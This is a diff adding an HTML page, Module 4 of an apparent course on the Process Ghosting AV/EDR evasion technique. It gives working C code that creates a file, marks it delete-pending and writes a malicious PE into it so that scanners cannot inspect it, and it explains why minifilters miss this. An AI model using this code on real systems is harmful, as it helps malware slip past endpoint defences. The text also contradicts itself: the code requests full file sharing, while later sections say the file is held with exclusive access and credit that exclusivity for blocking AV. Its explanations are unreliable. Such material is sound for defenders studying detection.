@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 4: Creating the Ghost File - ProcessGhosting Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F4A8;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#6366f1;--accent2:#4f46e5;--gradient:linear-gradient(135deg,#6366f1,#4f46e5)}</style>
+</head>
+<body>
+
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>ProcessGhosting</h2>
+<span>Ghost Process Evasion</span>
+</div>
+<a class="home-link" href="../ProcessGhosting_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span>1. Process Creation Internals</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module2.html"><span>2. PE Tampering Overview</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module3.html"><span>3. File States &amp; Delete-Pending</span><span class="diff d1">d1</span></a>
+<a class="mod-link active" href="module4.html"><span>4. Creating the Ghost File</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module5.html"><span>5. Section Mapping from Ghost</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module6.html"><span>6. Process &amp; Thread Creation</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module7.html"><span>7. AV/EDR Scan Timing</span><span class="diff d3">d3</span></a>
+<a class="mod-link" href="module8.html"><span>8. Full Chain &amp; Detection</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge med">Difficulty: Intermediate</span>
+<h1>Module 4: Creating the Ghost File</h1>
+<p class="subtitle">The first phase of Process Ghosting &mdash; creating a file, marking it for deletion, and writing the payload into a file that is already condemned.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>Implement the first half of the Process Ghosting chain: creating a temporary file with <code>NtCreateFile</code> using <code>FILE_SUPERSEDE</code>, marking it delete-pending via <code>NtSetInformationFile</code> with <code>FileDispositionInformation</code>, and writing the malicious PE payload into the delete-pending file. Understand why each parameter and flag is chosen.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. Step 1: Creating the Temporary File</h2>
+
+<p>The first step is creating a file on disk that will temporarily hold our payload PE. This file only needs to exist long enough for us to create a section from it. The file path can be anything writable &mdash; typically a temp directory:</p>
+
+<pre><code>HANDLE hFile = INVALID_HANDLE_VALUE;
+IO_STATUS_BLOCK iosb = { 0 };
+OBJECT_ATTRIBUTES objAttr = { 0 };
+UNICODE_STRING filePath;
+
+// Path for the temporary ghost file
+RtlInitUnicodeString(&filePath,
+    L"\\??\\C:\\Users\\Public\\ghost.exe");
+
+InitializeObjectAttributes(
+    &objAttr,
+    &filePath,
+    OBJ_CASE_INSENSITIVE,
+    NULL,
+    NULL
+);
+
+NTSTATUS status = NtCreateFile(
+    &hFile,
+    GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
+    &objAttr,
+    &iosb,
+    NULL,                       // AllocationSize (auto)
+    FILE_ATTRIBUTE_NORMAL,
+    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,  // ShareAccess
+    FILE_SUPERSEDE,             // CreateDisposition
+    FILE_SYNCHRONOUS_IO_NONALERT,  // CreateOptions
+    NULL,                       // EaBuffer
+    0                           // EaLength
+);</code></pre>
+
+<div class="card">
+<h4>Key Parameter Analysis</h4>
+<table>
+<tr><th>Parameter</th><th>Value</th><th>Why</th></tr>
+<tr><td><code>DesiredAccess</code></td><td><code>GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE</code></td><td><code>GENERIC_WRITE</code> for writing payload, <code>DELETE</code> for marking delete-pending, <code>SYNCHRONIZE</code> for synchronous I/O</td></tr>
+<tr><td><code>ShareAccess</code></td><td><code>FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE</code> (0x7)</td><td>Full sharing &mdash; the delete-pending state itself prevents other processes from opening the file, so exclusive access is not required</td></tr>
+<tr><td><code>CreateDisposition</code></td><td><code>FILE_SUPERSEDE</code></td><td>Creates new file or replaces existing one. Clean slate regardless of prior state.</td></tr>
+<tr><td><code>CreateOptions</code></td><td><code>FILE_SYNCHRONOUS_IO_NONALERT</code></td><td>Synchronous I/O simplifies subsequent write operations</td></tr>
+</table>
+</div>
+
+<!-- ============================================================ -->
+<h2>2. Understanding FILE_SUPERSEDE</h2>
+
+<p><code>FILE_SUPERSEDE</code> is the create disposition that means: if the file exists, delete it and create a new empty file; if it does not exist, create a new file. This is equivalent to <code>CREATE_ALWAYS</code> in Win32 terms but goes through a slightly different code path in the kernel.</p>
+
+<table>
+<tr><th>CreateDisposition</th><th>File Exists</th><th>File Does Not Exist</th><th>Win32 Equivalent</th></tr>
+<tr><td><code>FILE_SUPERSEDE</code></td><td>Replace (delete + create)</td><td>Create new</td><td><code>CREATE_ALWAYS</code></td></tr>
+<tr><td><code>FILE_CREATE</code></td><td>Fail</td><td>Create new</td><td><code>CREATE_NEW</code></td></tr>
+<tr><td><code>FILE_OPEN</code></td><td>Open existing</td><td>Fail</td><td><code>OPEN_EXISTING</code></td></tr>
+<tr><td><code>FILE_OPEN_IF</code></td><td>Open existing</td><td>Create new</td><td><code>OPEN_ALWAYS</code></td></tr>
+<tr><td><code>FILE_OVERWRITE</code></td><td>Open and truncate</td><td>Fail</td><td><code>TRUNCATE_EXISTING</code></td></tr>
+<tr><td><code>FILE_OVERWRITE_IF</code></td><td>Open and truncate</td><td>Create new</td><td><code>CREATE_ALWAYS</code></td></tr>
+</table>
+
+<p><code>FILE_SUPERSEDE</code> is preferred for ghosting because it guarantees a clean file regardless of what was there before, and it does not require the file to pre-exist.</p>
+
+<!-- ============================================================ -->
+<h2>3. Step 2: Marking Delete-Pending</h2>
+
+<p>With the file handle open, we immediately mark it for deletion using <code>NtSetInformationFile</code>. This must happen <strong>before</strong> writing the payload:</p>
+
+<pre><code>// Mark the file as delete-pending
+FILE_DISPOSITION_INFORMATION dispInfo = { 0 };
+dispInfo.DeleteFile = TRUE;
+
+status = NtSetInformationFile(
+    hFile,
+    &iosb,
+    &dispInfo,
+    sizeof(FILE_DISPOSITION_INFORMATION),
+    FileDispositionInformation  // InfoClass = 13
+);</code></pre>
+
+<div class="card highlight">
+<h4>Why Delete-Pending BEFORE Writing?</h4>
+<p>This order is critical. If we wrote the payload first and then tried to mark delete-pending, there is a window where the file exists on disk with malicious content and no deletion mark. An AV real-time scanner monitoring file writes could detect the payload during this window. By marking delete-pending first, we ensure that from the moment the payload touches the file, no other process can open it (they get <code>STATUS_DELETE_PENDING</code>).</p>
+</div>
+
+<p>After this call succeeds, the file is in the delete-pending state. Our handle is still fully functional, but any new attempt to open the file by another process will fail. The AV file system minifilter may see the <code>NtSetInformationFile</code> call, but at this point the file contains no payload yet &mdash; it is empty.</p>
+
+<!-- ============================================================ -->
+<h2>4. Step 3: Writing the Payload</h2>
+
+<p>Now we write the malicious PE into the delete-pending file. The file is condemned but our handle still works:</p>
+
+<pre><code>// Assume payloadBuffer contains the malicious PE bytes
+// and payloadSize is its size
+LARGE_INTEGER byteOffset = { 0 };
+
+status = NtWriteFile(
+    hFile,
+    NULL,           // Event
+    NULL,           // ApcRoutine
+    NULL,           // ApcContext
+    &iosb,
+    payloadBuffer,  // Buffer containing the PE
+    payloadSize,    // Length
+    &byteOffset,    // ByteOffset (start of file)
+    NULL            // Key
+);</code></pre>
+
+<div class="card">
+<h4>What Gets Written</h4>
+<p>The payload is a complete, valid PE file. It must be a properly formed executable because the kernel will parse it as a PE when creating the <code>SEC_IMAGE</code> section. This means valid MZ/PE headers, correct section alignment, valid entry point RVA, and proper import table (if imports are needed). The payload is typically read from an embedded resource, a separate file, or received over the network.</p>
+</div>
+
+<pre><code>// Loading the payload PE from a file (the source of the malicious image)
+HANDLE hPayloadFile = CreateFileW(
+    L"C:\\path\\to\\payload.exe",
+    GENERIC_READ, FILE_SHARE_READ,
+    NULL, OPEN_EXISTING, 0, NULL);
+
+DWORD payloadSize = GetFileSize(hPayloadFile, NULL);
+BYTE* payloadBuffer = (BYTE*)HeapAlloc(
+    GetProcessHeap(), 0, payloadSize);
+ReadFile(hPayloadFile, payloadBuffer, payloadSize, NULL, NULL);
+CloseHandle(hPayloadFile);
+
+// Now payloadBuffer contains the PE to ghost</code></pre>
+
+<!-- ============================================================ -->
+<h2>5. The File State After These Steps</h2>
+
+<p>After completing steps 1-3, the system is in the following state:</p>
+
+<div class="card green">
+<h4>Current State Summary</h4>
+<table>
+<tr><th>Component</th><th>State</th></tr>
+<tr><td><strong>File on disk</strong></td><td>Exists in MFT, data clusters contain the malicious PE, but marked delete-pending</td></tr>
+<tr><td><strong>File handle (hFile)</strong></td><td>Open, fully functional for read/write/section creation</td></tr>
+<tr><td><strong>Other processes</strong></td><td>Cannot open the file (<code>STATUS_DELETE_PENDING</code>)</td></tr>
+<tr><td><strong>AV scanner</strong></td><td>Cannot scan the file &mdash; cannot open it</td></tr>
+<tr><td><strong>Directory listing</strong></td><td>File may or may not appear depending on the query method</td></tr>
+</table>
+</div>
+
+<!-- ============================================================ -->
+<h2>6. Error Handling Considerations</h2>
+
+<p>Robust implementations must handle several potential failure points:</p>
+
+<pre><code>// Complete ghost file creation with error handling
+NTSTATUS CreateGhostFile(
+    LPCWSTR filePath,
+    PBYTE payloadBuffer,
+    DWORD payloadSize,
+    PHANDLE phFile)
+{
+    HANDLE hFile = INVALID_HANDLE_VALUE;
+    IO_STATUS_BLOCK iosb = { 0 };
+    OBJECT_ATTRIBUTES objAttr = { 0 };
+    UNICODE_STRING ntPath;
+    NTSTATUS status;
+
+    // Convert to NT path
+    RtlInitUnicodeString(&ntPath, filePath);
+    InitializeObjectAttributes(&objAttr, &ntPath,
+        OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+    // Step 1: Create the file
+    status = NtCreateFile(
+        &hFile,
+        GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
+        &objAttr, &iosb, NULL,
+        FILE_ATTRIBUTE_NORMAL,
+        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+        FILE_SUPERSEDE,
+        FILE_SYNCHRONOUS_IO_NONALERT,
+        NULL, 0);
+
+    if (!NT_SUCCESS(status)) {
+        // File creation failed - path not writable,
+        // permissions issue, etc.
+        return status;
+    }
+
+    // Step 2: Mark delete-pending
+    FILE_DISPOSITION_INFORMATION dispInfo = { 0 };
+    dispInfo.DeleteFile = TRUE;
+
+    status = NtSetInformationFile(
+        hFile, &iosb, &dispInfo,
+        sizeof(dispInfo),
+        FileDispositionInformation);
+
+    if (!NT_SUCCESS(status)) {
+        // Could not mark for deletion
+        NtClose(hFile);
+        return status;
+    }
+
+    // Step 3: Write the payload
+    LARGE_INTEGER offset = { 0 };
+    status = NtWriteFile(
+        hFile, NULL, NULL, NULL, &iosb,
+        payloadBuffer, payloadSize,
+        &offset, NULL);
+
+    if (!NT_SUCCESS(status)) {
+        // Write failed - close handle (file gets deleted)
+        NtClose(hFile);
+        return status;
+    }
+
+    *phFile = hFile;
+    return STATUS_SUCCESS;
+}</code></pre>
+
+<div class="card warn">
+<h4>Critical: Do Not Close the Handle Yet</h4>
+<p>After writing the payload, the file handle must remain open. Closing it would trigger the actual deletion (since the file is delete-pending), and we would lose our payload before we can create a section from it. The handle will be closed only after the section is successfully created in Module 5.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>7. AV Minifilter Interaction Timeline</h2>
+
+<p>Understanding when AV minifilter callbacks fire during this process reveals why the technique evades detection:</p>
+
+<table>
+<tr><th>Event</th><th>Minifilter Callback</th><th>What AV Sees</th></tr>
+<tr><td><code>NtCreateFile</code></td><td><code>IRP_MJ_CREATE</code> / pre/post create</td><td>New empty file being created &mdash; nothing malicious</td></tr>
+<tr><td><code>NtSetInformationFile</code></td><td><code>IRP_MJ_SET_INFORMATION</code></td><td>File marked for deletion &mdash; empty file being deleted (benign)</td></tr>
+<tr><td><code>NtWriteFile</code></td><td><code>IRP_MJ_WRITE</code></td><td>Data being written to a delete-pending file. AV might try to scan, but the file is delete-pending and exclusive &mdash; it cannot get a second handle to read it.</td></tr>
+</table>
+
+<p>The key evasion: even if the AV minifilter sees the write IRP, it cannot independently open the file to scan it because the file is delete-pending with exclusive access.</p>
+
+<!-- ============================================================ -->
+<h2>8. Implementation in hasherezade&rsquo;s PoC</h2>
+
+<p>Process Ghosting was discovered and documented by Gabriel Landau of Elastic Security. In the proof-of-concept <code>process_ghosting</code> repository, hasherezade wraps these operations in helper functions. The core logic follows the exact pattern described above, using the NT-native API throughout to avoid Win32-level hooks and monitoring:</p>
+
+<pre><code>// Conceptual representation of the hasherezade implementation
+bool make_ghost_file(
+    const wchar_t* ghostPath,
+    BYTE* payload, size_t payloadSize,
+    HANDLE &outFileHandle)
+{
+    HANDLE hFile = nullptr;
+    // NtCreateFile with FILE_SUPERSEDE, exclusive access
+    if (!nt_create_file(ghostPath, &hFile)) return false;
+
+    // NtSetInformationFile - mark delete pending
+    if (!nt_set_delete_pending(hFile, true)) {
+        NtClose(hFile);
+        return false;
+    }
+
+    // NtWriteFile - write the payload PE
+    if (!nt_write_file(hFile, payload, payloadSize)) {
+        NtClose(hFile);
+        return false;
+    }
+
+    outFileHandle = hFile;
+    return true;  // handle stays open for section creation
+}</code></pre>
+
+<p>The function returns the open handle, which is passed to the next phase (section creation) covered in Module 5.</p>
+
+<!-- ============================================================ -->
+<div class="quiz">
+<h2>Knowledge Check</h2>
+
+<div class="quiz-q" data-answer="B">
+<p>Q1: Why is the file marked delete-pending BEFORE writing the malicious payload?</p>
+<div class="quiz-btn" data-choice="A">A) Because NtWriteFile requires the file to be in delete-pending state</div>
+<div class="quiz-btn" data-choice="B">B) To ensure no other process can open and scan the file from the moment payload data is written</div>
+<div class="quiz-btn" data-choice="C">C) Because FILE_SUPERSEDE requires delete-pending to be set first</div>
+<div class="quiz-btn" data-choice="D">D) To make the NtWriteFile call faster</div>
+</div>
+
+<div class="quiz-q" data-answer="D">
+<p>Q2: What does FILE_SUPERSEDE do as a CreateDisposition?</p>
+<div class="quiz-btn" data-choice="A">A) Opens the file only if it already exists</div>
+<div class="quiz-btn" data-choice="B">B) Opens the file and appends to it</div>
+<div class="quiz-btn" data-choice="C">C) Creates the file only if it does not exist</div>
+<div class="quiz-btn" data-choice="D">D) If the file exists, deletes and recreates it; if not, creates a new file</div>
+</div>
+
+<div class="quiz-q" data-answer="A">
+<p>Q3: What happens if you close the file handle immediately after writing the payload (before creating the section)?</p>
+<div class="quiz-btn" data-choice="A">A) The file is deleted because it is delete-pending, and the payload is lost</div>
+<div class="quiz-btn" data-choice="B">B) The file is saved normally and the delete-pending flag is cleared</div>
+<div class="quiz-btn" data-choice="C">C) The file remains on disk in delete-pending state indefinitely</div>
+<div class="quiz-btn" data-choice="D">D) The kernel automatically creates a section before deleting the file</div>
+</div>
+</div>
+
+<div class="nav-btns">
+<a href="module3.html">&larr; Prev: File System States &amp; Delete-Pending</a>
+<a class="primary" href="module5.html">Next: Section Mapping from Ghost &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
